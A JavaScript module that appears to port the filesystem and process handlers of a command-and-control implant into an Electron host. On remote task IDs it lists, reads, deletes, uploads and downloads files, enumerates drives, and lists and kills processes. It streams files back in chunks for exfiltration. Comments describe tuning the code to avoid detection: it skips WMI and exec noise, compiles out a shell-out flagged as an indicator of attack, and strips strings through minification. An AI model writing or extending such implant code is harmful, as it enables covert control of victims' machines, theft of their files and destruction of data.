// fsops.js — filesystem/process command handlers, framing per Commander.cpp:
//   CD(8)     in: [str path][taskId]              out: [taskId][8][str cwd]
//   LS(14)    in: [str path][taskId]              out: [taskId][14][u8 ok][str full][u32 n]{[u8 dir][u64 size][u32 mtime][str name]}*
//   CAT(24)   in: [str path][taskId]              out: [taskId][24][str path][bytes content<=2048]
//   RM(17)    in: [str path][taskId]              out: [taskId][17][u8 wasDir]
//   MKDIR(27) in: [str path][taskId]              out: [taskId][27][str path]
//   DISKS(15) in: [taskId]                        out: [taskId][15][u8 ok][u32 n]{[str drive]}* (win32 only; posix: ok=0)
//   PWD(4)    in: [taskId]                        out: [taskId][4][str cwd]
//   PS_LIST(41) in: [taskId]                      out: [taskId][41][u8 ok][u32 n]{[u16 pid][u16 ppid][u16 sess][u8 arch][u8 elev][str domain][str user][str name]}*
//   PS_KILL(42) in: [u32 pid][taskId]             out: [taskId][42][u32 pid]
//   SAVEMEMORY(0x2321) in: [u32 id][u32 total][bytes chunk][taskId]  out: NONE (MemorySaver.cpp)
//   UPLOAD(33)  in: [u32 memId][str path][taskId] out: [taskId][33][u8 result]  (CREATE_NEW semantics)
//   DOWNLOAD(32) in: [str path][u32 fileId][taskId]
//               out: start [taskId][32][fileId][u8 1][u64 size][str fullpath]
//                    chunk [taskId][32][fileId][u8 2][bytes]  (pump per tick)
//                    done  [taskId][32][fileId][u8 3]
//   DOWNLOAD_STATE(35) in: [u32 state][u32 fileId][taskId] out: [taskId][35][fileId][u8 state]
//   errors: [taskId][0x1111ffff][u32 win32err]
const fs = require('fs');
const path = require('path');

const { CP } = require('./tasks');
const ERRNO = { EACCES: 5, EPERM: 5, ENOENT: 2, ENOTDIR: 3, EEXIST: 80, ENOTEMPTY: 145, EISDIR: 2, EINVAL: 87 };
const errCode = (e) => ERRNO[e && e.code] || 1;

function createState() {
  return { cwd: process.cwd(), downloads: new Map(), memory: new Map() };
}

function resolve(state, p) {
  p = String(p);
  if (path.isAbsolute(p) || /^[A-Za-z]:[\\/]/.test(p) || p.startsWith('\\\\')) return p;
  return path.resolve(state.cwd, p);
}

// returns OutPacker | null (no reply by design) | undefined (not our command)
function dispatch(commandId, r, cfg, state, OutPacker) {
  const out = new OutPacker();

  if (commandId === CP.PWD) {
    const taskId = r.u32();
    return out.u32(taskId).u32(CP.PWD).str(state.cwd);
  }
  if (commandId === CP.CD) {
    const target = r.str(); const taskId = r.u32();
    try {
      const nd = resolve(state, target);
      fs.statSync(nd); // throws if missing
      state.cwd = nd;
      return out.u32(taskId).u32(CP.CD).str(state.cwd);
    } catch (e) { return out.u32(taskId).u32(CP.ERROR).u32(errCode(e)); }
  }
  if (commandId === CP.LS) {
    const target = r.str(); const taskId = r.u32();
    try {
      const dir = resolve(state, target === '.' ? state.cwd : target);
      const names = fs.readdirSync(dir);
      out.u32(taskId).u32(CP.LS).u8(1).str(dir).u32(names.length);
      for (const n of names) {
        let st = null; try { st = fs.statSync(path.join(dir, n)); } catch (_) {}
        out.u8(st && st.isDirectory() ? 1 : 0)
           .u64(st ? BigInt(st.size) : 0n)
           .u32(st ? Math.floor(st.mtimeMs / 1000) : 0)
           .str(n);
      }
      return out;
    } catch (e) { return out.u32(taskId).u32(CP.LS).u8(0).u32(errCode(e)); }
  }
  if (commandId === CP.CAT) {
    const target = r.str(); const taskId = r.u32();
    try {
      const p = resolve(state, target);
      const buf = fs.readFileSync(p);
      return out.u32(taskId).u32(CP.CAT).str(p).bytes(buf.subarray(0, 2048));
    } catch (e) { return out.u32(taskId).u32(CP.ERROR).u32(errCode(e)); }
  }
  if (commandId === CP.MKDIR) {
    const target = r.str(); const taskId = r.u32();
    try {
      const p = resolve(state, target);
      fs.mkdirSync(p, { recursive: true });
      return out.u32(taskId).u32(CP.MKDIR).str(p);
    } catch (e) { return out.u32(taskId).u32(CP.ERROR).u32(errCode(e)); }
  }
  if (commandId === CP.RM) {
    const target = r.str(); const taskId = r.u32();
    try {
      const p = resolve(state, target);
      const st = fs.statSync(p);
      if (st.isDirectory()) fs.rmSync(p, { recursive: true, force: true });
      else fs.unlinkSync(p);
      return out.u32(taskId).u32(CP.RM).u8(st.isDirectory() ? 1 : 0);
    } catch (e) { return out.u32(taskId).u32(CP.ERROR).u32(errCode(e)); }
  }
  if (commandId === CP.DISKS) {
    const taskId = r.u32();
    if (process.platform !== 'win32') return out.u32(taskId).u32(CP.DISKS).u8(0).u32(0);
    const drives = [];
    for (let c = 65; c <= 90; c++) { // A..Z bitmap walk, no WMI/exec noise
      const d = String.fromCharCode(c) + ':\\';
      try { fs.statSync(d); drives.push(d); } catch (_) {}
    }
    out.u32(taskId).u32(CP.DISKS).u8(1).u32(drives.length);
    for (const d of drives) out.str(d);
    return out;
  }
  if (commandId === CP.PS_LIST) {
    const taskId = r.u32();
    // /proc on posix; win32 needs a --allow-shellout build (see psList).
    // Default builds answer with a clean not-supported frame.
    try {
      const rows = psList();
      if (!rows) return out.u32(taskId).u32(CP.PS_LIST).u8(0).u32(50);
      out.u32(taskId).u32(CP.PS_LIST).u8(1).u32(rows.length);
      for (const row of rows) {
        out.u16(row.pid).u16(row.ppid).u16(row.sess).u8(row.arch).u8(row.elev)
           .str(row.domain).str(row.user).str(row.name);
      }
      return out;
    } catch (e) { return out.u32(taskId).u32(CP.PS_LIST).u8(0).u32(errCode(e)); }
  }
  if (commandId === CP.PS_KILL) {
    const pid = r.u32(); const taskId = r.u32();
    try { process.kill(pid); } catch (_) {}
    return out.u32(taskId).u32(CP.PS_KILL).u32(pid);
  }

  // ---- upload (SAVEMEMORY chunks arrive first, UPLOAD finalizes) ----------
  if (commandId === CP.SAVEMEMORY) {
    const memId = r.u32(); const total = r.u32(); const chunk = r.raw(); r.u32(); // taskId unused
    let m = state.memory.get(memId);
    if (!m) { m = { total, parts: [], have: 0 }; state.memory.set(memId, m); }
    m.parts.push(chunk); m.have += chunk.length;
    if (m.have >= m.total) m.complete = true;
    return null; // no reply by design
  }
  if (commandId === CP.UPLOAD) {
    const memId = r.u32(); const target = r.str(); const taskId = r.u32();
    const m = state.memory.get(memId);
    out.u32(taskId).u32(CP.UPLOAD);
    if (!m || !m.complete) return out.u8(0);
    try {
      const p = resolve(state, target);
      const fd = fs.openSync(p, 'wx'); // CREATE_NEW: never clobber
      fs.writeSync(fd, Buffer.concat(m.parts));
      fs.closeSync(fd);
      state.memory.delete(memId);
      return out.u8(1);
    } catch (_) { return out.u8(0); }
  }

  // ---- download (chunked pump over ticks) ----------------------------------
  if (commandId === CP.DOWNLOAD) {
    const target = r.str(); const fileId = r.u32(); const taskId = r.u32();
    out.u32(taskId).u32(CP.DOWNLOAD);
    try {
      const p = resolve(state, target);
      const st = fs.statSync(p);
      if (!st.isFile()) throw Object.assign(new Error('not a file'), { code: 'EISDIR' });
      const fd = fs.openSync(p, 'r');
      state.downloads.set(fileId, { fd, path: p, size: Number(st.size), sent: 0, taskId, running: true });
      return out.u32(fileId).u8(1).u64(BigInt(st.size)).str(p);
    } catch (e) {
      out.u32(CP.ERROR).u32(errCode(e));
      return out;
    }
  }
  if (commandId === CP.DOWNLOAD_STATE) {
    const newState = r.u32(); const fileId = r.u32(); const taskId = r.u32();
    const d = state.downloads.get(fileId);
    out.u32(taskId);
    if (d) {
      d.running = newState === 1;             // 1=resume 2=pause-ish; 4=cancel
      if (newState === 4) { try { fs.closeSync(d.fd); } catch (_) {} state.downloads.delete(fileId); }
      return out.u32(CP.DOWNLOAD_STATE).u32(fileId).u8(newState);
    }
    return out.u32(CP.ERROR).u32(87);
  }
  return undefined;
}

// every tick: stream one chunk per running download (Downloader.cpp parity)
function processDownloads(state, outputs, cfg) {
  for (const [fileId, d] of state.downloads) {
    if (!d.running) continue;
    const chunk = Buffer.allocUnsafe(cfg.file_chunk_size);
    let n = 0;
    try { n = fs.readSync(d.fd, chunk, 0, chunk.length, null); } catch (_) { n = 0; }
    if (n > 0) {
      d.sent += n;
      outputs.u32(d.taskId).u32(CP.DOWNLOAD).u32(fileId).u8(2).bytes(chunk.subarray(0, n));
      if (d.sent >= d.size) {
        outputs.u32(d.taskId).u32(CP.DOWNLOAD).u32(fileId).u8(3);
        try { fs.closeSync(d.fd); } catch (_) {}
        state.downloads.delete(fileId);
      }
    } else { // read error/EOF mismatch -> finish frame then drop
      outputs.u32(d.taskId).u32(CP.DOWNLOAD).u32(fileId).u8(3);
      try { fs.closeSync(d.fd); } catch (_) {}
      state.downloads.delete(fileId);
    }
    break; // one chunk per tick (C++ iterates all; we keep ticks light)
  }
}

function psList() {
  if (process.platform === 'win32') {
    // win32 ps without native deps means tasklist — a child_process spawn under
    // the Electron host (process-chain IoA, ticket 001). Compiled in ONLY for
    // --allow-shellout builds; esbuild's define makes this branch unreachable
    // by default and minify drops it (strings included) from the artifact.
    if (globalThis.__LW_SHELLOUT__ !== true) return null;
    const { execSync } = require('child_process');
    const txt = execSync('tasklist /fo csv /nh', { windowsHide: true, maxBuffer: 16 << 20 }).toString('latin1');
    const rows = [];
    for (const line of txt.split('\n')) {
      const m = line.match(/^"([^"]+)","(\d+)","([^"]*)","(\d+)","[\d.,]+ [KM]"/);
      if (!m) continue;
      rows.push({ pid: parseInt(m[2], 10), ppid: 0, sess: parseInt(m[4], 10) || 0,
                  arch: 1, elev: 0, domain: '', user: '', name: m[1] });
    }
    return rows;
  }
  // posix: /proc
  const rows = [];
  for (const d of fs.readdirSync('/proc')) {
    if (!/^\d+$/.test(d)) continue;
    let name = '', ppid = 0, user = '';
    try { name = fs.readFileSync(`/proc/${d}/comm`, 'utf8').trim(); } catch (_) { continue; }
    try { const s = fs.readFileSync(`/proc/${d}/status`, 'utf8');
      const m1 = s.match(/^PPid:\s*(\d+)/m); if (m1) ppid = parseInt(m1[1], 10);
      const m2 = s.match(/^Uid:\s*(\d+)/m); if (m2) user = m2[1] === '0' ? 'root' : m2[1];
    } catch (_) {}
    rows.push({ pid: parseInt(d, 10), ppid, sess: 0, arch: 1, elev: 0, domain: '', user, name });
  }
  return rows;
}

module.exports = { dispatch, processDownloads, createState, CP };
